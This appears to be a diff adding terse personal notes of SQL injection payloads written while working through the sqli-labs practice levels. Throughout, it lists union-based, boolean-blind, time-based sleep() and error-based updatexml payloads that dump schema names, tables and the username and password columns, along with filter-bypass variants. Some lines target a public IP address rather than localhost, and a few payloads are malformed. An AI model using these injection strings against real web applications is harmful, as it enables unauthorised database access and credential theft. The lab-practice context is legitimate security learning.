@@ -1,0 +1,86 @@
+select schema_name from information_schema.schemata;
+select table_name from information_schema.tables where table_schema='security';
+select column_name from information_schema.columns where table_name='users';
+select username,password from security.users;
+
+
+
+less-15
+uname=adminadmin&passwd=admiand' or if(length()>1000,1,sleep(5))#&submit=Submit
+select table_name from information_schema.tables where table_schema='security'
+ 
+ uname=adminadmin&passwd=admiand' or left((select table_name from information_schema.tables where table_schema='security' limit 0,1),1)>'a'#&submit=Submit
+
+ uname=adminadmin&passwd=admiand' or left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)>'a'#&submit=Submit
+ uname=adminadmin&passwd=admiand' or left((select username from security.users limit 0,1),1)>'a'#&submit=Submit
+ uname=adminadmin&passwd=admiand' or left((select username from security.users limit 0,1),1)= 'a'#&submit=Submit
+ 
+ less-16
+ uname=adminadmin&passwd=admiand") or if(length()>1000,1,sleep(5))#&submit=Submit
+select table_name from information_schema.tables where table_schema='security'
+ 
+ uname=adminadmin&passwd=admiand' or left((select table_name from information_schema.tables where table_schema='security' limit 0,1),1)>'a'#&submit=Submit
+
+ uname=adminadmin&passwd=admiand' or left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)>'a'#&submit=Submit
+ uname=adminadmin&passwd=admiand' or left((select username from security.users limit 0,1),1)>'a'#&submit=Submit
+ uname=adminadmin&passwd=admiand' or left((select username from security.users limit 0,1),1)= 'a'#&submit=Submit
+
+ less-23
+ less-01 
+SELECT * FROM users WHERE id='-1' union select 1,2,group_concat(schema_name) from information_schema.schemata -- ' LIMIT 0,1
+SELECT * FROM users WHERE id='-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata) '' LIMIT 0,1
+
+
+group_concat(schema_name) from information_schema.schemata
+group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479
+group_concat(column_name) from information_schema.columns where table_name=0x7573657273
+group_concat(concat_ws(0x7e,username,password)) from security.users
+
+if(length(database())>1,1,sleep(5))  判断长度
+if(left(database(),1)>'a',1,sleep(5))
+if(left((select schema_name from information_schema.schemata limit 0,1),1)>'a',1,sleep(5))
+
+
+http://127.0.0.1/sqli/Less-26/?id=1' ||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security')%26%26(table_name='users'))),0)||'1'='1
+http://127.0.0.1/sqli/Less-26/?id=1' || updatexml(0,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where （table_schema='security'）&&(table_name=0x7573657273))),0) || '1'='1
+http://127.0.0.1/sqli/Less-26/?id=1' || updatexml(1, concat( 0x7e,( select (group_concat(column_name))from (infoorrmation_schema.columns) where (table_name='security')%26%26(table_name='users')) )),1);%00
+
+
+group_concat(schema_name) from    information_schema.schemata
+group_concat(table_name) from  information_schema.tables where table_schema = 0x7365637572697479
+group_concat(column_name) from information_schema.columns where table_name = 0x7573657273
+group_concat(concat_ws(0x7e,username,password)) from security.users
+
+
+ ;%00   
+ --+
+ # 
+ http://127.0.0.1/sqli/Less-23/?id=1' or '1'='1 order by 10'
+ http://127.0.0.1/sqli/Less-23/?id=1' order by 10 or '1'='1 
+
+ union select 1,2,3;
+ union select 1,2,(select * from xxxx)
+group_concat()
+
+admin:admin
+
+get   id 
+
+post
+
+select {x schema_name} from {x information_schema.schemata};
+
+updatexml(1, concat(0x7e, ( database()  ) ),1)
+
+if( length(database())>1, 1, sleep(5)    )
+updatexml(1, concat(0x7e, (select  (group_concat(table_name)) from  (information_schema.tables) where (table_schema = 0x7365637572697479)  ) ),1)
+
+updatexml(1, concat(0x7e, (select (group_concat(column_name)) from information_schema.columns where table_name = 0x7573657273  ) ),1)
+
+updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,password))) from (security.users)  ) ),1)
+
+url = "http://121.199.30.46/Less-26/?id=1'" + code_0x + %26%26 + code_0x "'1'='1"
+http://121.199.30.46/Less-26/?id=1' 空格 && 空格 '1'='1
+
+A or B  and D
+C  and D
